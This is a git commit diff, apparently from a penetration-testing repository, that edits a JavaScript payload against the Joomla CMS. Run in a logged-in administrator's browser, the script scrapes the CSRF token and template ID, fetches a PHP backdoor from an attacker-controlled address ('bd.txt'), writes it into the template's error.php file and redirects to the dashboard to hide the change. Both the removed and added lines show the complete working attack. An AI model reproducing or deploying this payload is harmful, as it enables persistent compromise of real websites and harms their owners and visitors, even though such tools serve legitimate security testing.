9993e2e3d3bbd749617077d43f69fa10d0e7cfbe
Lighthouse IT Security <84382227+lighthouseitsecurity@users.noreply.github.com>
2025-04-26 18:15:23 +0200

    updated

--- CMS/Joomla/PatchFile/patchFileJoomla.js
+++ CMS/Joomla/PatchFile/patchFileJoomla.js
@@ -1,14 +1,14 @@
-const phpBdURL = "http://192.168.5.15/bd.txt";
-const joomlaRoot = "";
-const templateURL = joomlaRoot + "/administrator/index.php?option=com_templates&view=templates&client_id=0";
-const dashboardURL = joomlaRoot + "/administrator/index.php";
+const phpBdURL = 'http://192.168.5.5/bd.txt';  // !!! CHANGE THIS !!!
+const joomlaRoot = '';                         // !!! CHANGE THIS !!!
+const joomlaTemplateURL = joomlaRoot + '/administrator/index.php?option=com_templates&view=templates&client_id=0';
+const joomlaDashboardURL = joomlaRoot + '/administrator/index.php';
 const req = new XMLHttpRequest();
-req.open("GET", templateURL, false);
+req.open('GET', joomlaTemplateURL, false);
 req.send(null);
 const templateID = req.responseText.match(/option=com_templates&amp;view=template&amp;id=(\d+)&amp;file=([^"]*?)"/)[1];
 const csrfToken = req.responseText.match(/"csrf.token":"([^"]*?)"/)[1];
-const editTemplateURL = joomlaRoot + "/administrator/index.php?option=com_templates&view=template&id=" + templateID + "&file=L2Vycm9yLnBocA%3D%3D&isMedia=0";
-req.open("GET", editTemplateURL, false);
+const joomlaEditTemplateURL = joomlaRoot + '/administrator/index.php?option=com_templates&view=template&id=' + templateID + '&file=L2Vycm9yLnBocA%3D%3D&isMedia=0';
+req.open('GET', joomlaEditTemplateURL, false);
 req.send(null);
 const currContent = req.responseText.match(/<textarea name="jform\[source\]".*">([\s\S]*)<\/textarea>/)[1];
 const formFilename = req.responseText.match(/id="jform_filename"[\s\S]*value="(\/[^"]*?)"/)[1];
@@ -17,21 +17,21 @@ async function fetchPHPBd(phpBdURL) {
   const bdContent = await response.text();
   return bdContent;
 }
-var phpBd = "";
-fetchPHPBd(phpBdURL + "?" + encodeURIComponent(formFilename)).then(bdContent => {
+let phpBd = '';
+fetchPHPBd(phpBdURL + '?' + encodeURIComponent(formFilename)).then(bdContent => {
   phpBd = bdContent;
   function decodeEntity(inStr) {
-    const textarea = document.createElement("textarea");
+    const textarea = document.createElement('textarea');
     textarea.innerHTML = inStr;
     return textarea.value;
   }
-  const bodyData = "isMedia=0&jform%5Bsource%5D=" + encodeURIComponent(phpBd) + encodeURIComponent(decodeEntity(currContent)) + "&task=template.save&" + csrfToken + "=1&jform%5Bextension_id%5D=" + templateID + "&jform%5Bfilename%5D=" + encodeURIComponent(formFilename);
-  req.open("POST", editTemplateURL, true);
-  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  const bodyData = 'isMedia=0&jform%5Bsource%5D=' + encodeURIComponent(phpBd) + encodeURIComponent(decodeEntity(currContent)) + '&task=template.save&' + csrfToken + '=1&jform%5Bextension_id%5D=' + templateID + '&jform%5Bfilename%5D=' + encodeURIComponent(formFilename);
+  req.open('POST', joomlaEditTemplateURL, true);
+  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
   req.send(bodyData);
   req.onreadystatechange = function() {
     if (req.readyState == XMLHttpRequest.DONE) {
-      window.location.replace(dashboardURL);
+      window.location.replace(joomlaDashboardURL);
     }
   }
 });
